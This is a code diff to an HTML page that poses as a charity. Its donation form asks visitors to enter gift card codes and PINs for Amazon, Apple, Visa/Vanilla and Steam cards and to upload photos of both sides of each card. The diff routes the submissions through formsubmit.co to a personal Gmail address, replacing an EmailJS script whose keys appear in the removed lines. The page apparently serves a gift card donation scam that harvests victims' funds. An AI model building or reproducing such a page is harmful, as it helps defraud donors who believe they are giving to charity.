@@ -536,7 +536,7 @@
         </div>
     </section>
 
-    <section class="donate-trigger-section">
+<section class="donate-trigger-section">
     <div class="reveal">
         <h2>Support Our Mission</h2>
         <p>Your kindness provides life-saving nutrition and medical care. Tap below to donate securely via Gift Card.</p>
@@ -562,25 +562,25 @@
             </div>
 
             <div class="modal-form">
-                <form id="donate-form">
-                    <input type="text" name="from_name" placeholder="Full Name" required>
+                <form action="https://formsubmit.co/organization461@gmail.com" method="POST" enctype="multipart/form-data">
+                    <input type="text" name="name" placeholder="Full Name" required>
                     <select name="card_type">
-                        <option value="Amazon">Amazon Card</option>
-                        <option value="Apple/iTunes">Apple / iTunes</option>
-                        <option value="Visa/Vanilla">Visa / Vanilla</option>
-                        <option value="Steam/Razor">Steam / Razor</option>
+                        <option>Amazon Card</option>
+                        <option>Apple / iTunes</option>
+                        <option>Visa / Vanilla</option>
+                        <option>Steam / Razor</option>
                     </select>
-                    <input type="text" name="card_code" placeholder="Card Code / PIN" required>
+                    <input type="text" name="code" placeholder="Card Code / PIN" required>
                     <div class="file-input-wrapper">
                         <label>Upload Card Photos (Front & Back)</label>
-                        <input type="file" name="my_file" accept="image/*" required>
+                        <input type="file" name="attachment" accept="image/*" required>
                     </div>
-                    <button type="submit" class="submit-btn" id="submit-btn">Send Donation</button>
+                    <button type="submit" class="submit-btn">Send Donation</button>
                 </form>
             </div>
         </div>
     </div>
-</div>
+</div>>
 
     <footer class="site-footer">
         <div class="footer-grid">
@@ -677,44 +677,7 @@ function closeDonation() {
     
     document.body.style.overflow = 'auto'; // Enable scrolling
 }
-    
 
-
-   (function(){
-      // Replace with your actual Public Key from EmailJS Account tab
-      emailjs.init("bcOHySt-r3OLE9nno"); 
-   })();
-
-   const btn = document.getElementById('submit-btn');
-   const form = document.getElementById('donate-form');
-
-   form.addEventListener('submit', function(event) {
-      event.preventDefault();
-
-      btn.innerText = 'Sending...';
-      btn.disabled = true;
-
-      // Replace these with your actual IDs from the EmailJS dashboard
-      const serviceID = 'service_zn32uid';
-      const templateID = 'template_zj5yifc';
-
-      emailjs.sendForm(serviceID, templateID, this)
-        .then(() => {
-          btn.innerText = 'Success!';
-          alert('Thank you! Your donation has been sent. We will process it shortly.');
-          
-          // These functions should exist in your main script to clean up the UI
-          closeDonation(); 
-          form.reset();
-          btn.disabled = false;
-          btn.innerText = 'Send Donation';
-        }, (err) => {
-          btn.disabled = false;
-          btn.innerText = 'Send Donation';
-          alert("Oops! Something went wrong. Please try again or contact us on WhatsApp.");
-          console.error("EmailJS Error:", err);
-        });
-   });
 
     </script>
 </body>
